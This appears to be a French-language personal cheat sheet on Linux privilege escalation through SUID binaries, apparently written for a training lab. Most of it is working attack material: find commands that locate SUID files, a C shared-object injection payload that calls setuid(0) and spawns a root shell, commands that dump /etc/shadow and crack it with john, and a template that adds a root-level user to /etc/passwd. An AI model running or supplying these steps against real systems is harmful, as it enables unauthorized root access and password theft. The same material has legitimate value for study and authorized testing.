```sh
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -user root -perm /4000 -exec ls -ldb {} \; 2>/dev/null
```

Liste tout les fichiers qui ont des bits SUID ou SGID définis

```sh
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Recherchez tous les exécutables SUID/SGID.
Cela peut aussi afficher les programmes et leurs version une recherche dessus est importante.

---
**Shared Object Injection (injection d'objets partagés.)**
L'  exécutable `/usr/local/bin/suid-so` SUID est vulnérable à l'injection d'objets partagés.

> `strace` permet de voir les appels que fait un programme au système d'exploitation, ce qui peut être utile pour comprendre son fonctionnement.

Exécutez **strace** sur le fichier et recherchez dans la sortie les appels d'ouverture/accès et les erreurs « aucun fichier de ce type » :

```sh
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```


> Verifier si l'exécutable tente de charger certain objet partagé dans certain répertoire mais ne la trouve pas; verifier aussi si vous avez des droits d'ecriture sur ces dossier introuvable.


**Exploiter:**

Code C:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

```sh
gcc -shared -fPIC -o /FULL_PATH_TO/FILE.so libcalc.c
```

```sh
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

**Environment Variables (Variables d'environnement)**
L' exécutable **/usr/local/bin/suid-env** peut être exploité car il hérite de la variable d'environnement PATH de l'utilisateur et tente d'exécuter des programmes sans spécifier de chemin absolu.

Utiliser `string /usr/local/suid-env`

Voir la partie [[PATH]]

---
### Exploiter un compte

**Option 1: Craquage de mot de passe**

```sh
cat /etc/passwd > passwd.txt
cat /etc/shadow > shadow.txt
```

```sh
unshadow passwd.txt shadow.txt > crack.txt
```

```sh
john crack.txt --wordlist=/opt/rockyou.txt
```

**Option 2: Cree un utilisateur**
Ajouter un nouvel utilisateur disposant des privilèges root. ce qui contourne le processus fastidieux de craquage de mot de passe

- Nous ajouterons ensuite ce mot de passe avec un nom d'utilisateur au `/etc/passwd`
- basculer vers cet utilisateur nouvellement creer

```sh
openssl passwd -1 salt USERNAME PASSWORD
```

Modele:
```
[NEW_USERNAME]:[NEW_PASSWORD]:0:0:root:/root:/bin/bash
```


---
**Sources de recherche :**
- [GTFOBin](https://gtfobins.github.io/)

